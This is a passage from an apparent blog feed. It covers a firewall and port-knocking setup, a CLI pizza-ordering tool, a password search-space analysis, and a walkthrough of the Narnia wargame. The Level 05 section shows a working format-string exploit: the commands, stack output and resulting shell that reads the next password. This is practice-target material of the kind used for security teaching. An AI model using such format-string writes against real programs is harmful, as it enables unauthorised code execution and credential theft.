&lt;/pre&gt;
&lt;p&gt;Set it to anything that doesn't clash with other services. i.e. not 25 or 80 for example.&lt;/p&gt;
&lt;p&gt;Once configured &lt;code&gt;sudo service sshd reload&lt;/code&gt; to pick up the changes.&lt;/p&gt;
&lt;p&gt;So next up &lt;cite&gt;iptables&lt;/cite&gt;. I followed &lt;a class="reference external" href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-firewall-using-ip-tables-on-ubuntu-12-04"&gt;this guide&lt;/a&gt;
which gives you a good start. Be sure to run &lt;code&gt;sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT&lt;/code&gt; first.
Otherwise you'll end up blocking your current connection and... yeah, ok, I made that mistake.&lt;/p&gt;
&lt;p&gt;Then allow what you need and default to dropping the rest. It's all in the URL above, but to re-iterate:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;#&lt;/span&gt; Accept connections on port 22
&lt;span class="go"&gt;iptables -A INPUT -p tcp --syn --destination-port 22 -j ACCEPT

&lt;/span&gt;&lt;span class="gp"&gt;#&lt;/span&gt; Deny all other input
&lt;span class="go"&gt;iptables -A INPUT -p tcp -syn -j DROP&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;You will need to run the first line for each port that needs to be able to accept
incoming connections.&lt;/p&gt;
&lt;p&gt;I additionally set up &lt;a class="reference external" href="http://www.zeroflux.org/projects/knock"&gt;knockd&lt;/a&gt; just to play around with it.&lt;/p&gt;
&lt;p&gt;To do this edit &lt;code&gt;/etc/knockd.conf&lt;/code&gt; and set the port sequences. It should have a default
set for enabling and disabling the ssh port. Edit this to reflect any port changes. If you want to run miltiple commands
for a knock, simply concatenate the command with &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;. You can even make one command open
a port for a given time. As we have our &lt;em&gt;keep established connections&lt;/em&gt; rule in &lt;code&gt;iptables&lt;/code&gt; we
can do&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;[opencloseSSH]
        sequence      = 2222:udp,3333:tcp,4444:udp
        seq_timeout   = 15
        tcpflags      = syn,ack
        start_command = /usr/sbin/iptables -A INPUT -s %IP% -p tcp --syn --dport 22 -j ACCEPT
        cmd_timeout   = 10
        stop_command  = /usr/sbin/iptables -D INPUT -s %IP% -p tcp --syn --dport 22 -j ACCEPT&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Lifted from the docs. This will allow and block only the IP from where the knock originated.&lt;/p&gt;
&lt;p&gt;That's all for now. Postfix next time....&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>How's that Pizza coming along?</title><link href="http://unlogic.co.uk/2015/04/15/hows-that-pizza-coming-along/" rel="alternate"></link><updated>2015-05-14T17:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-04-15:2015/04/15/hows-that-pizza-coming-along/</id><summary type="html">&lt;p&gt;&lt;strong&gt;UPDATE&lt;/strong&gt;: Published what I have done so far &lt;a class="reference external" href="https://github.com/Svenito/dominos"&gt;on my Github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Having been a bit busy with other things recently, I've not mentioned the Domino's
thing for a while. So in case anyone is wondering where I am with this:&lt;/p&gt;
&lt;script type="text/javascript" src="https://asciinema.org/a/17706.js" id="asciicast-17706" async&gt;&lt;/script&gt;&lt;p&gt;Basically I've reworked how the store finder works. I've collapsed the whole store finding and
delivery postcode stuff into one &lt;code&gt;locate_store&lt;/code&gt; call.
Enter your postcode and it'll get the nearest delivery capable store and select it.
Much simpler, as you can see.&lt;/p&gt;
&lt;p&gt;Now you also specify your name, phone number, and email when you select the
delivery address. The payment side of things is coming along, but is only in debug
at the moment.&lt;/p&gt;
&lt;div class="section" id="what-s-planned"&gt;
&lt;h2&gt;What's planned&lt;/h2&gt;
&lt;p&gt;I want to actually place a &lt;em&gt;cash on delivery&lt;/em&gt; order and eat a CLI pizza. Once that's finished,
I will clean up the project, put it on Github, and package it for &lt;em&gt;pip&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Then I'll get to work on investigating if I can handle card payments via this tool too. Certainly
there seems to be some relevant info available. With some luck this will work on some sort of
URL callback, but I'll find out eventually.&lt;/p&gt;
&lt;p&gt;Then it's really about hoping that enough people like it, and want to help
by adding support for ordering in their own country.&lt;/p&gt;
&lt;/div&gt;
</summary><category term="[]"></category></entry><entry><title>Revisiting strong passwords</title><link href="http://unlogic.co.uk/2015/04/14/revisiting-strong-passwords/" rel="alternate"></link><updated>2015-04-14T09:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-04-14:2015/04/14/revisiting-strong-passwords/</id><summary type="html">&lt;p&gt;Some time ago I wrote a post about &lt;a class="reference external" href="http://unlogic.co.uk/2012/06/06/strong-passwords/"&gt;strong passwords&lt;/a&gt;.
That was three years ago and I figured I might as well revist what I wrote back then.&lt;/p&gt;
&lt;p&gt;Since then technology has moved on a lot, and the number of password breaches has increased,
aswell as the number of reports mocking our poorly chosen passwords.&lt;/p&gt;
&lt;p&gt;As far as I am concerned, I am still using 15-18 random character passwords. I'm no longer
lowercase only, but a mixture of upper, lower, digit, and punctuation. The length depends
on how long I am allowed to make my passwords. Believe it or not, some sites limit you to
a maximum length of 12, possibly less on some sites. Silly huh? Not only that, but still they
tell me my 18 character password without punctuation or digits is less secure than a
4 character mixed character password. Hmph.&lt;/p&gt;
&lt;p&gt;But what is cropping up more and more, and what I wanted to write about, is the password
rules on signup pages. For example &amp;quot;Your password must be at least 8
characters long, contain one upper case letter, and a number.&amp;quot; Sometimes a &lt;em&gt;special
character&lt;/em&gt; is thrown into the mix too. The issue here is, that although your final
password is more secure (in theory), the search space for a valid password is reduced.
With some attackers being able to generate 1 trillion guesses per second, keeping the
size of the search space large will help.&lt;/p&gt;
&lt;p&gt;By how much difference does it make? Well that's what I want to figure out.&lt;/p&gt;
&lt;p&gt;So using the commonly used english alphabet with digits and
special characters we have the following available&lt;/p&gt;
&lt;pre class="code literal-block"&gt;
Name    | Content                           | Character Count
--------|-----------------------------------|-----------------
lower   | abcdefghijklmnopqrstuvwxyz        | 26
upper   | ABCDEFGHIJKLMNOPQRSTUVWXYZ        | 26
digits  | 0123456789                        | 10
special | !&amp;quot;#$%&amp;amp;'()*+,-./:;&amp;lt;=&amp;gt;?&amp;#64;[\]^_{\|}~` | 32
&lt;/pre&gt;
&lt;p&gt;Let's assume that I have a list of password hashes from somewhere. I know
that the password is exactly 6 characters long (which I think is
a reasonably common password length these days), and I also know what rules
govern the choice of password when it is created. We'll look at these rules in
turn and see how much difference they make. I fix the password length so I don't
introduce too many variables.&lt;/p&gt;
&lt;p&gt;I'll be basing the calculations of a few assumptions:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Hashes are SHA256&lt;/li&gt;
&lt;li&gt;We have a &lt;em&gt;reasonable&lt;/em&gt; PC available (1x NVidia gtx580), managing 355 Mh/s (355,000,000 hashes/s) (&lt;a class="reference external" href="https://hashcat.net/oclhashcat/#performance)"&gt;ref&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;These are pure bruteforce attacks. No wordlists, permutation or combination attacks&lt;/li&gt;
&lt;li&gt;Timings for each attack assume &lt;em&gt;worst case&lt;/em&gt;. i.e. we have to run through all guesses.
Usually an attack stops when a valid match is found, shortening the attack.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let's analyse how different password creation rules affect the duration of the attack.&lt;/p&gt;
&lt;p&gt;For reference, these are the number of possible combinations for each set of
characters&lt;/p&gt;
&lt;pre class="code literal-block"&gt;
Possible characters           | Character count | Number of combinations
------------------------------|-----------------|-----------------------
lower only                    | 26              | 308,915,776
upper and lower               | 52              | 19,770,609,664
upper, lower, digits          | 62              | 56,800,235,584
upper, lower, digits, special | 94              | 689,869,781,056
&lt;/pre&gt;
&lt;div class="section" id="no-rules"&gt;
&lt;h2&gt;No rules&lt;/h2&gt;
&lt;p&gt;Using any combination of characters the number of possible passwords is &lt;em&gt;689,869,781,056&lt;/em&gt;.
It would take &lt;em&gt;1943.29 seconds&lt;/em&gt; (689,869,781,056 / 355,000,000) to crack this password.
That's just over half an hour.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Attack time&lt;/em&gt;: 1943.29seconds&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="at-least-one-upper-case"&gt;
&lt;h2&gt;At least one upper case&lt;/h2&gt;
&lt;p&gt;If we are forced to chose at least one upper case character, we are also saying that
there are no passwords now with just lowercase characters. The number of possible
combinations is now &lt;em&gt;689,869,781,056 - 308,915,776 = 689,560,865,280&lt;/em&gt;, or &lt;em&gt;99%&lt;/em&gt; of
the original search space. This is a small impact of only 1 second.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Attack time&lt;/em&gt;: 1942.42seconds&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="at-least-one-upper-case-and-one-digit"&gt;
&lt;h2&gt;At least one upper case and one digit&lt;/h2&gt;
&lt;p&gt;Now we know that there are no passwords with just lowercase, or with lower and uppercase only.
Therefore we can also remove these from the list of possibilities. Our new number is now
&lt;em&gt;689,869,781,056 - 308,915,776 - 19,770,609,664 = 669,790,255,616&lt;/em&gt; or &lt;em&gt;97%&lt;/em&gt; of our search space.
Now we're starting to see savings of up around 100seconds. In the grand scheme of things,
still not much&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Attack time&lt;/em&gt;: 1886.73seconds&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="must-contain-all-of-the-above"&gt;
&lt;h2&gt;Must contain all of the above&lt;/h2&gt;
&lt;p&gt;Upper, lower, digits, and special all need to be present. Therefore we can remove all the
other possiblities for a grand total of:
&lt;em&gt;689,869,781,056 - 308,915,776 - 19,770,609,664 - 56,800,235,584 = 612,990,020,032&lt;/em&gt; or
&lt;em&gt;88%&lt;/em&gt; of the original. Now we've saved another 100 seconds.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Attack time&lt;/em&gt;: 1726.73seconds&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="conclusion"&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Although contrived, this scenario should indicate that &lt;em&gt;forcing&lt;/em&gt; people to do
things in the interest of security can help attackers too. If we are allowed
to use any character out of the full set, an attack would have taken 4 minutes more than
if we are forced to create a &lt;em&gt;secure&lt;/em&gt; password that &lt;em&gt;must&lt;/em&gt; use certain characters.
The difference isn't much if you look above, but bear in mind that the longest attack
is &lt;em&gt;1.12&lt;/em&gt; times longer. If we extrapolate this to a 8 character password,
it's a difference of almost 2 years (51.18 vs 49.7).&lt;/p&gt;
&lt;p&gt;Needless to say, knowing the minimum length reduces the search space once again,
because now I won't even bother with anything below 8 characters. That's a fairly big
chunk of possibilities.&lt;/p&gt;
&lt;p&gt;The times can be further optimised by employing wordlists, known substitutions and other
rules. The more you know about the nature of the password, the less time it takes
to crack it. Yes, applying rules and substitutions to wordlists takes time, but it's
insignificant to the amount of time they can shave off of a brute force attack. And
the more an attacker knows about the nature and composition of your password, the
better they can tailor their wordlists.&lt;/p&gt;
&lt;p&gt;Even &lt;a class="reference external" href="http://www.wired.com/2015/04/snowden-sexy-margaret-thatcher-password-isnt-so-sexy/"&gt;Edward Snowden's advice isn't bulletrpoof&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;The key really is not to force people to have a specific password combination, but
to encourage good password creation. Long, random, and unpredictable, passwords
from a large vat of possibilities.&lt;/p&gt;
&lt;p&gt;Don't tell attackers what the password isn't. Let them guess.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Solving Narnia Part 2</title><link href="http://unlogic.co.uk/2015/04/13/solving-narnia-part-2/" rel="alternate"></link><updated>2015-04-13T20:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-04-13:2015/04/13/solving-narnia-part-2/</id><summary type="html">&lt;p&gt;Carrying on from &lt;a class="reference external" href="http://unlogic.co.uk/2015/04/08/solving-narnia-part1/"&gt;Part 1&lt;/a&gt;&lt;/p&gt;
&lt;div class="section" id="level-05"&gt;
&lt;h2&gt;Level 05&lt;/h2&gt;
&lt;pre class="code c literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

        &lt;span class="n"&gt;snprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
        &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="k"&gt;sizeof&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Change i's value from 1 -&amp;gt; 500. &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
                &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;GOOD&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;

        &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;No way...let me give you a hint!&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;buffer : [%s] (%d)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
        &lt;span class="n"&gt;printf&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;i = %d (%p)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;A fixed sized buffer again. This time however trying to overflow it in order to
write to &lt;code&gt;i&lt;/code&gt; won't work. If we look at line 9 and lookup the manpage for &lt;code&gt;snprintf&lt;/code&gt;
we see that&lt;/p&gt;
&lt;blockquote&gt;
The  functions  snprintf() and vsnprintf() write at most size bytes
(including the trailing null byte ('0')) to str.&lt;/blockquote&gt;
&lt;p&gt;So we won't be able to overflow this buffer. Going through the usual possible exploits
we've only really go one more to try: &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Uncontrolled_format_string"&gt;format string attack&lt;/a&gt; or
&lt;em&gt;uncontrolled format string vulnerability&lt;/em&gt;. This happens when user input
isn't checked, and allows the user to use format characters (&lt;code&gt;%s&lt;/code&gt;, &lt;code&gt;%x&lt;/code&gt;) to read or
manipulate the stack.&lt;/p&gt;
&lt;p&gt;For me this is one of the harder exploits to understand, so this level is
great practice for me. So if it doesn't make sense at first, stick with it and
try various strings. Hopefully you'll grok it at some point.&lt;/p&gt;
&lt;p&gt;Let's check to see if our hunch is right. Using a few characters to start, I
then append a list of &lt;code&gt;%x&lt;/code&gt;, which read values from the stack and print them.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia5&amp;#64;melinda:/narnia$&lt;/span&gt; ./narnia5 &lt;span class="sb"&gt;`&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print 'aaaa'+'%x'*10&amp;quot;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;span class="go"&gt;Change i's value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [aaaaf7eb75b6ffffffffffffd6aef7e2fbf8616161616265376636623537666] (63)
i = 1 (0xffffd6cc)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Sure enough we see the beginning of the input string after the 4th &lt;code&gt;%x&lt;/code&gt;. So we then
put the address if &lt;code&gt;i&lt;/code&gt; into that location like and shorten the number of &lt;code&gt;%x&lt;/code&gt;.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia5&amp;#64;melinda:/narnia$&lt;/span&gt; ./narnia5 &lt;span class="sb"&gt;`&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print '\xcc\xd6\xff\xff'+'%x'*5&amp;quot;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;span class="go"&gt;Change i's value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8ffffd6cc] (44)
i = 1 (0xffffd6cc)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Now we have the address of &lt;code&gt;i&lt;/code&gt;, we use &lt;code&gt;%n&lt;/code&gt; to write to that address, remembering
to remove one &lt;code&gt;%x&lt;/code&gt; to keep the right length.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;narnia5&amp;#64;melinda:/narnia$&lt;/span&gt; ./narnia5 &lt;span class="sb"&gt;`&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print '\xcc\xd6\xff\xff'+'%x'*4 + '%n'&amp;quot;&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;
&lt;span class="go"&gt;Change i's value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6aef7e2fbf8] (36)
i = 36 (0xffffd6cc)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So we see that we've written the length of the string into &lt;code&gt;i&lt;/code&gt;. We already have
a value of 36, but we need 500. To achieve this we need to pad the string.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="o"&gt;&lt;/span&gt;&lt;span class="gp"&gt;narnia5&amp;#64;melinda:/narnia$ ./narnia5 $&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print '\xcc\xd6\xff\xff'+'%x'*3 + '%500d' + '%n'&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;Change i's value from 1 -&amp;gt; 500. No way...let me give you a hint!
buffer : [����f7eb75b6ffffffffffffd6ae                                   ] (63)
i = 528 (0xffffd6cc)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;We're &lt;em&gt;28&lt;/em&gt; over the target, so let's reduce the padding&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="o"&gt;&lt;/span&gt;&lt;span class="gp"&gt;narnia5&amp;#64;melinda:/narnia$ ./narnia5 $&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;python -c &lt;span class="s2"&gt;&amp;quot;print '\xcc\xd6\xff\xff'+'%x'*3 + '%472d' + '%n'&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;Change i's value from 1 -&amp;gt; 500. GOOD
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; whoami
&lt;span class="go"&gt;narnia6
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat /etc/narnia_pass/narnia6
&lt;span class="go"&gt;[password]&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="level-06"&gt;
&lt;h2&gt;Level 06&lt;/h2&gt;
&lt;pre class="code c literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="k"&gt;extern&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// tired of fixing values...
// - morla
&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;long&lt;/span&gt; &lt;span class="nf"&gt;get_sp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
       &lt;span class="n"&gt;__asm__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;movl %esp,%eax&lt;/span&gt;&lt;span class="se"&gt;\n\t&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
               &lt;span class="s"&gt;&amp;quot;and $0xff000000, %eax&amp;quot;&lt;/span&gt;
               &lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[]){&lt;/span&gt;
        &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;b1&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;b2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
        &lt;span class="kt"&gt;int&lt;/span&gt;  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fp&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt; &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%s b1 b2&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt; &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;

        &lt;span class="cm"&gt;/* clear environ */&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="sc"&gt;'\0'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]));&lt;/span&gt;
        &lt;span class="cm"&gt;/* clear argz    */&lt;/span&gt;
